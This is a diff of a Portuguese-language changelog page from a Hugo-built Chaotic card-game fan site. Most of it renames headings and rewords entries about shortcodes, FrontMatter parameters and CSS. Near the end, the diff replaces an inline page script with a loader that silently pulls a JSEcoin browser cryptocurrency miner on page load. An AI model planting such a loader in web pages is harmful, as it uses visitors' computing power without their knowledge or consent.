-<h4 id="correções-1">Correções</h4>
+<h4 id="correções-2">Correções</h4>
 
-<h6 id="estruturais-3">Estruturais</h6>
+<h6 id="estruturais-7">Estruturais</h6>
 
 <ul>
 <li>Corrigido um problema com o Buscador de Cartas que este funcionasse online, especificamente por conta de HTML Minifier que removiam elementos vazios que iriam ser populados dinamicamente</li>
 </ul>
 
-<h6 id="sobre-o-hugo-4">Sobre o Hugo</h6>
+<h6 id="relacionadas-ao-hugo-7">Relacionadas ao Hugo</h6>
 
 <ul>
 <li>Corrigido um problema de longa data quanto ao rodapé cobrir parte do conteúdo principal</li>
 </ul>
 
-<h4 id="alterações-diversas-1">Alterações Diversas</h4>
+<h4 id="alterações-diversas-2">Alterações Diversas</h4>
 
 <ul>
 <li><p>Atualizado o arquivo com os ícones SVG da UI, reordenando algumas definições de uma forma mais significativa</p></li>
@@ -860,24 +1208,24 @@
 
 <p><small>Publicada em 06/27/2018 às 18:05:58</small></p>
 
-<h4 id="adições-2">Adições</h4>
+<h4 id="adições-3">Adições</h4>
 
-<h6 id="estruturais-4">Estruturais</h6>
+<h6 id="estruturais-8">Estruturais</h6>
 
 <ul>
 <li><p>Adicionados Parâmetros ao FrontMatter para descrever a <em>altura</em> e a <em>largura</em> das imagens da maioria dos Arquivos de Conteúdo</p></li>
 
-<li><p>Adicionado o recém-implementado atributo <em>picture</em> ao Shortcode de Cartas com o caminho das imagens usadas. Mesmo que ele seja o mesmo do Parâmetro de FrontMatter <em>picture.path</em> isso abre a possibilidade para uma futura atualização de expandir o Shortcode de &ldquo;Imagem&rdquo; atualmente em uso pelas variações da Carta pelo Shortcode de &ldquo;Cartas&rdquo;, provendo mais informações a serem analisadas pelo Buscador de Cartas.</p></li>
+<li><p>Adicionado o recém-implementado atributo <em>picture</em> ao Shortcode <em>Cards</em> com o caminho das imagens usadas. Mesmo que ele seja o mesmo do Parâmetro de FrontMatter <em>picture.path</em> isso abre a possibilidade para uma futura atualização de expandir o Shortcode <em>Picture</em> atualmente em uso pelas variações da Carta pelo Shortcode <em>Cards</em>, provendo mais informações a serem analisadas pelo Buscador de Cartas.</p></li>
 
 <li><p>Adicionado os recentemente implementados Parâmetros de FrontMatter para desabilitar o Plugin de Comentários do Facebook e/ou prevenir que o Google Analytics seja incluído nos seguintes Arquivos de Conteúdo: Páginas de Categorias (Ataques, Equipamentos de Batalha, Locais, Mugics e Criaturas), Páginas de Subcategoria (Outro Mundo, Submundo, Mipedians, Danians, M&rsquo;arrillians e Sem Tribo) e Página dos Dizeres Legais.</p></li>
 </ul>
 
-<h6 id="sobre-os-artigos">Sobre os Artigos</h6>
+<h6 id="relacionadas-aos-artigos-publicados-6">Relacionadas aos Artigos Publicados</h6>
 
 <ul>
-<li><p>Adicionados todos os &ldquo;Flavour Texts&rdquo; disponíveis usando o Shortcode de &ldquo;Citação&rdquo;</p></li>
+<li><p>Adicionados todos os &ldquo;Flavour Texts&rdquo; disponíveis usando o Shortcode <em>Quote</em></p></li>
 
-<li><p>Adicionado o novo Shortcode de &ldquo;Índice&rdquo; nos Artigos publicados e Páginas de Artigos que tenham um &ldquo;Flavour Text&rdquo;, removendo assim grande parte dos &ldquo;Em Construção&rdquo;</p></li>
+<li><p>Adicionado o novo Shortcode <em>ToC</em> nos Artigos publicados e Páginas de Artigos que tenham um &ldquo;Flavour Text&rdquo;, removendo assim grande parte dos &ldquo;Em Construção&rdquo;</p></li>
 
 <li><p>Adicionada a entrada faltante <em>skin</em> sob o Parâmetro de FrontMatter <em>traits</em> para o Chaor</p></li>
 
@@ -896,7 +1244,7 @@
 <li><p>Parcialmente publicado (por desmarcar como Rascunho) o Artigo sobre o Hune Canin</p></li>
 </ul>
 
-<h6 id="sobre-as-páginas-de-vídeo-1">Sobre as Páginas de Vídeo</h6>
+<h6 id="relacionadas-às-páginas-dos-episódios-4">Relacionadas às Páginas dos Episódios</h6>
 
 <ul>
 <li><p>Adicionado o recém-renomeado Parâmetro de FrontMatter <em>section</em> a todas as Páginas de Vídeo</p></li>
@@ -906,7 +1254,7 @@
 <li><p>Adicionadas palavras-chave faltantes para: Episódio #03, Temporada #01; Episódio #27, Temporada #02</p></li>
 </ul>
 
-<h6 id="sobre-o-hugo-5">Sobre o Hugo</h6>
+<h6 id="relacionadas-ao-hugo-8">Relacionadas ao Hugo</h6>
 
 <ul>
 <li><p>Implementada a renomeação Parâmetro de FrontMatter <em>section</em> (ou <em>type</em>, no caso de Páginas de Artigo), <em>picture</em> e <em>languages</em></p></li>
@@ -924,7 +1272,7 @@
 <li><p>Adicionado atributo <code>alt</code> requerido às imagens usadas para criar o Ícone de Carregamento</p></li>
 </ul>
 
-<h6 id="novo-conteúdos">Novo Conteúdos</h6>
+<h6 id="novos-conteúdos-1">Novos Conteúdos</h6>
 
 <ul>
 <li>Geral
@@ -975,7 +1323,7 @@
 </ul></li>
 </ul>
 
-<h6 id="sobre-i18n-internacionalização">Sobre i18n (Internacionalização)</h6>
+<h6 id="relacionadas-à-internacionalização-i18n">Relacionadas à Internacionalização (i18n)</h6>
 
 <ul>
 <li><p>Adicionadas as seguintes novas entradas:</p></li>
@@ -1037,12 +1385,12 @@
 </ul></li>
 </ul>
 
-<h4 id="remoções-2">Remoções</h4>
+<h4 id="remoções-3">Remoções</h4>
 
-<h6 id="estruturais-5">Estruturais</h6>
+<h6 id="estruturais-9">Estruturais</h6>
 
 <ul>
-<li><p>Removido os Parâmetros de FrontMatter <em>card</em> e <em>subtext</em>, já que agora eles serão gerenciados pelo Parâmetro <em>picture</em> e pelo Shortcode de &ldquo;Citação&rdquo;, respectivamente</p></li>
+<li><p>Removido os Parâmetros de FrontMatter <em>card</em> e <em>subtext</em>, já que agora eles serão gerenciados pelo Parâmetro <em>picture</em> e pelo Shortcode <em>Quote</em>, respectivamente</p></li>
 
 <li><p>Removido os Título de Seção &ldquo;Habilidades&rdquo;, anteriormente adicionados sob &ldquo;Jogo&rdquo;, já que ele estava apenas amontoando o Índice</p></li>
 
@@ -1051,19 +1399,19 @@
 <li><p>Removidas Rotinas em Tempo de Execução do Buscador de Cartas como Parâmetro de FrontMatter já que isso não é mais possível, adicionando-as diretamente no script</p></li>
 </ul>
 
-<h6 id="sobre-os-artigos-1">Sobre os Artigos</h6>
+<h6 id="relacionadas-aos-artigos-publicados-7">Relacionadas aos Artigos Publicados</h6>
 
 <ul>
 <li>Removido o Nome do Artigo principal de suas variantes — ex: em vez de &ldquo;Chaor — Feroz&rdquo; agora apenas &ldquo;Feroz&rdquo; é mostrado — limpando o Índice</li>
 </ul>
 
-<h6 id="sobre-as-páginas-de-vídeo-2">Sobre as Páginas de Vídeo</h6>
+<h6 id="relacionadas-às-páginas-dos-episódios-5">Relacionadas às Páginas dos Episódios</h6>
 
 <ul>
 <li>Removido todos os espelhos do Vimeo dos Episódios dublados em Português Brasileiro</li>
 </ul>
 
-<h6 id="sobre-o-hugo-6">Sobre o Hugo</h6>
+<h6 id="relacionadas-ao-hugo-9">Relacionadas ao Hugo</h6>
 
 <ul>
 <li><p>Com as alterações feitas quanto aos Flavour Texts em forma de Citação (veja abaixo), o Modelo Parcial de &ldquo;Citação&rdquo; se tornou obsoleto e, assim, foi removido</p></li>
@@ -1073,9 +1421,9 @@
 <li><p>Removidos o recurso de Scripts em Tempo de Execução do Modelo de Rodapé porque apesar de parecer interessante e organizado, na verdade, era difícil de manter e, possivelmente, uma brecha de segurança</p></li>
 </ul>
 
-<h4 id="alterações-2">Alterações</h4>
+<h4 id="alterações-3">Alterações</h4>
 
-<h6 id="estruturais-6">Estruturais</h6>
+<h6 id="estruturais-10">Estruturais</h6>
 
 <ul>
 <li><p>Alterado o Parâmetro de FrontMatter <em>thumbnail</em> por <em>picture</em>, afinal, ele cuida mais da Grande Imagem dos Artigos do que as Miniaturas das Páginas de Listagem</p></li>
@@ -1097,7 +1445,7 @@
 <li><p>Renomeado o Arquivo de Conteúdo da <strong>Dranakis Threshold</strong> para combinar com a convenção de nomenclatura de todos os outros. De qualquer jeito, isso significa a remoção e a adição de arquivos</p></li>
 </ul>
 
-<h6 id="sobre-os-artigos-2">Sobre os Artigos</h6>
+<h6 id="relacionadas-aos-artigos-publicados-8">Relacionadas aos Artigos Publicados</h6>
 
 <ul>
 <li><p>Revisados todos os Links em Markdown, adicionando uma barra (/) ao final de cada um deles</p></li>
@@ -1113,7 +1461,7 @@
 <li><p>Atualizado as descrições dos Parâmetros de FrontMatter&rsquo; na versão em Inglês do Artigo da Takinom</p></li>
 </ul>
 
-<h6 id="sobre-as-páginas-de-vídeo-3">Sobre as Páginas de Vídeo</h6>
+<h6 id="relacionadas-às-páginas-dos-episódios-6">Relacionadas às Páginas dos Episódios</h6>
 
 <ul>
 <li><p>Todos os espelhos no YouTube agora são forçados a usar a versão mais de acordo com a GDPR por alterar o domínio para <code>youtube-nocookie.com</code></p></li>
@@ -1121,7 +1469,7 @@
 <li><p>Alterada a <em>Data de Publicação</em> de todos os Episódios dublados em Português do Brasil</p></li>
 </ul>
 
-<h6 id="sobre-o-hugo-7">Sobre o Hugo</h6>
+<h6 id="relacionadas-ao-hugo-10">Relacionadas ao Hugo</h6>
 
 <ul>
 <li><p>Ajustadas diversas classes do Sistema de Grade do Bootstrap e adicionadas algumas CSS Media Queries para melhorar a legibilidade e a disposição do conteúdo em dispositivos móveis</p></li>
@@ -1136,7 +1484,7 @@
 
 <li><p>O JS/HTML dos Modelos Parciais usados foram expandidos, afinal, se eles serão comprimidos novamente por algum HTML Minifier ou pela Cloudflare, que fiquem legíveis</p></li>
 
-<li><p>O Shortcode de &ldquo;Citações&rdquo; foi simplificado com uma versão mais limpa e com uma marcação menos problemática que usa os Atributos de um Shortcode do Hugo em vez dos Parâmetros de FrontMatter, permitindo que um único Modelo de Shortcode gerencie todos os casos de uma Citação, mesmo que se houver um que fique abaixo de uma Imagem Grande precisem agora ser adicionado manualmente nos Arquivos de Conteúdo</p></li>
+<li><p>O Shortcode <em>Quote</em> foi simplificado com uma versão mais limpa e com uma marcação menos problemática que usa os Atributos de um Shortcode do Hugo em vez dos Parâmetros de FrontMatter, permitindo que um único Modelo de Shortcode gerencie todos os casos de uma Citação, mesmo que se houver um que fique abaixo de uma Imagem Grande precisem agora ser adicionado manualmente nos Arquivos de Conteúdo</p></li>
 
 <li><p>A marcação das Grandes Imagens foi modificada para refletir as alterações feitas no CSS para acomodar os Créditos das Imagens</p></li>
 
@@ -1144,7 +1492,7 @@
 
 <li><p>A coluna com a Biografia das Criaturas foi aumentada para visualização em dispositivos móveis por reduzir um pouco a coluna com os rótulos dando espaço para mais texto</p></li>
 
-<li><p>A marcação do Shortcode &ldquo;Picture&rdquo; foi expandida para refletir as mudanças feitas no CSS para acomodar os Créditos das Imagens -E- para melhorar o visual com margens agora universalizadas</p></li>
+<li><p>A marcação do Shortcode <em>icture</em> foi expandida para refletir as mudanças feitas no CSS para acomodar os Créditos das Imagens -E- para melhorar o visual com margens agora universalizadas</p></li>
 
 <li><p>A marcação dos Episódios/Curiosidades foi ajustada para refletir as mudanças feitas no CSS para melhor acomodar os Breadcrumbs</p></li>
 
@@ -1153,9 +1501,9 @@
 <li><p>Basicamente todo o conteúdo de todos os Modelos usados para os Episódios/Curiosidades foram re-indentados</p></li>
 </ul>
 
-<h4 id="correções-2">Correções</h4>
+<h4 id="correções-3">Correções</h4>
 
-<h6 id="estruturais-7">Estruturais</h6>
+<h6 id="estruturais-11">Estruturais</h6>
 
 <ul>
 <li><p>Corrigidos diversos pares de aspas mal formados em alguns Parâmetros de FrontMatter, notavelmente o Parâmetro <em>url</em> que, apesar de o Hugo lidar por si mesmo, removendo-os, estava causando alguns problemas com outros Parâmetros</p></li>
@@ -1165,13 +1513,13 @@
 <li><p>Corrido o Parâmetro de FrontMatter <em>loyalty</em> que estava om um formato inválido na tradução em Português Brasileiro do Artigo da Takinom</p></li>
 </ul>
 
-<h6 id="sobre-os-artigos-3">Sobre os Artigos</h6>
+<h6 id="relacionadas-aos-artigos-publicados-9">Relacionadas aos Artigos Publicados</h6>
 
 <ul>
 <li>Corrigida a <em>Data de Publicação</em> dos Artigos sobre as Geleiras e o Lago Ken-I-Po</li>
 </ul>
 
-<h6 id="sobre-as-páginas-de-vídeo-4">Sobre as Páginas de Vídeo</h6>
+<h6 id="relacionadas-às-páginas-dos-episódios-7">Relacionadas às Páginas dos Episódios</h6>
 
 <ul>
 <li><p>Corrigidas palavras-chave incorretas no: Episódio #25, Temporada #01, Episódio 01, Temporada #03, Episódio #11, Temporada #03</p></li>
@@ -1179,7 +1527,7 @@
 <li><p>Corrigida uma palavra-chave grafada incorretamente no Episódio #28, Temporada #01</p></li>
 </ul>
 
-<h4 id="alterações-nas-imagens">Alterações nas Imagens</h4>
+<h4 id="relacionadas-às-imagens">Relacionadas às Imagens</h4>
 
 <h6 id="imagens-grandes-adicionadas-substituídas">Imagens Grandes adicionadas/substituídas</h6>
 
@@ -1278,10 +1626,10 @@
 <li><p>Atualizado o arquivo com os ícones SVG da UI para adicionar o atributo faltante <code>viewBox</code> à definição do ícone do Facebook e para incluir definições para os ícones do Github e do HUGO</p></li>
 </ul>
 
-<h4 id="alterações-diversas-2">Alterações Diversas</h4>
+<h4 id="alterações-diversas-3">Alterações Diversas</h4>
 
 <ul>
-<li><p>Alterações maciças no arquivo CSS principal com respeito a: GDPR, Shortcode de &ldquo;Citações&rdquo;, Créditos de Imagens, ajustes nas margens dos elementos, &ldquo;correções&rdquo; ao mau comportamento do HUGO e blocos de comentários (vários deles)</p></li>
+<li><p>Alterações maciças no arquivo CSS principal com respeito a: GDPR, Shortcode <em>Quote</em>, Créditos de Imagens, ajustes nas margens dos elementos, &ldquo;correções&rdquo; ao mau comportamento do HUGO e blocos de comentários (vários deles)</p></li>
 
 <li><p>Adicionado mais um parâmetro aos <code>&lt;iframe&gt;</code> criados em Tempo de Execução para os players de vídeo para reforçar ainda mais a privacidade</p></li>
 
@@ -1296,17 +1644,19 @@
 <li><p>Atualizados CSS e JS minificados</p></li>
 </ul>
 
-      
+    
 
-      
+  
 
-      
+  
+
+  
 
   
 
 
 
-    </section>
+</section>
 
       
 
@@ -1423,24 +1773,22 @@
 
       <div id="fb-root">&nbsp;</div>
 
-      
-
-  
-
-
-
       <script src="/assets/js/chaotic.js"></script>
 
       
-
-      
-
-      
-
-      
-        <script>
-          function popup(e,o,n,t){wLeft=window.screenLeft?window.screenLeft:window.screenX,wTop=window.screenTop?window.screenTop:window.screenY;var a=wLeft+window.innerWidth/2-n/2,i=wTop+window.innerHeight/2-t/2;return window.open(e,o,"toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=no, resizable=no, copyhistory=no, width="+n+", height="+t+", top="+i+", left="+a)}!function(){"use strict";if(navigator.userAgent.match(/IEMobile\/10\.0/)){var e=document.createElement("style");e.appendChild(document.createTextNode("@-ms-viewport{width:auto!important}")),document.head.appendChild(e)}}(),$(document).ready(function(){i();var e=window.location.hash;e&&$('ul.nav-pills a[href="'+e+'"]').tab("show");var o=$("#server-selection"),n=$(".loading-icon");if(e){o.hide(),n.removeClass("hidden");var t=$(e).find(".player");$("<iframe/>",{src:t.parent().attr("data-url")}).attr({allow:"encrypted-media",allowfullscreen:"",mozallowfullscreen:"",webkitAllowFullScreen:"",scrolling:"no"}).appendTo(t),t.find("iframe").on("load iframeready",a(e))}function a(e){$(e).tab("show"),o.hide(),window.location.hash=e.hash||e,$("html, body").scrollTop(0)}function i(){void 0!==Cookies.get("gdpr")?$("footer.gdpr").addClass("hidden"):$("footer.gdpr").removeClass("hidden")}$(".nav-pills a").on("click",function(e){$(".loading-icon").removeClass("hidden");var o=$(this.hash).find(".player");0==o.find("iframe").length&&$("<iframe/>",{src:o.parent().attr("data-url")}).attr({allowfullscreen:"",mozallowfullscreen:"",webkitAllowFullScreen:"",scrolling:"no"}).appendTo(o),o.find("iframe").on("load iframeready",a(this))}),$("#social a[data-href]").on("click",function(e){var o=$(this);e.preventDefault(),popup(o.attr("data-href"),o.data("title")||"",o.data("width")||500,o.data("height")||300)}),$("footer.gdpr .accepted").on("click",function(){Cookies.set("gdpr","1"),i()}),$("footer.gdpr .declined").on("click",function(){Cookies.set("gdpr","0"),i()})});
+      <script type="text/javascript">
+          !function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/72849/chaoticonline.ml/0/0/",s.parentNode.insertBefore(t,s)}();
       </script>
+      
+
+      
+
+      
+
+      
+
+      
+        <script src="/src/js/chaotic.js"></script>
       
 
     
